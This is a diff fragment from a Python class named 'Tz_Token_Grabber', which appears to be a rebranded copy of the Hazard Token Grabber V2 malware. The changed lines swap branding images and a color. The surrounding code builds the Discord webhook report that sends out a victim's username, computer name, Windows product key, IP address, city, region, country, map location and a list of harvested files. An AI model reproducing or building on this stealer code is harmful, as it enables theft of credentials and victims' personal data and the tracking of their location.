@@ -424,19 +424,19 @@ class Tz_Token_Grabber:
             self.files += f"\n{f}"
         self.fileCount = f"{len(files)} Arquivos encontrados: "
         embed = {
-            "avatar_url":"https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif",
+            "avatar_url":"https://media.discordapp.net/attachments/952559002959622194/953743745394823208/117966341_104860601338765_8966921483520606588_n.jpg",
             "embeds": [
                 {
                     "author": {
                         "name": "Tz Token Grabber",
                         "url": "https://instagram.com/tzfofo",
-                        "icon_url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif"
+                        "icon_url": "https://media.discordapp.net/attachments/952559002959622194/953747136523165756/tz.gif"
                     },
                     "description": f'**{os.getlogin()}** Acabei de executar o Grabber do Tz\n```fix\nNome do computador: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCidade: {city}\nRegião: {region}\nPaís: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
-                    "color": 1752220,
+                    "color": 2303786,
 
                     "thumbnail": {
-                      "url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Hazard.gif"
+                      "url": "https://media.discordapp.net/attachments/952559002959622194/953747136523165756/tz.gif"
                     },       
 
                     "footer": {
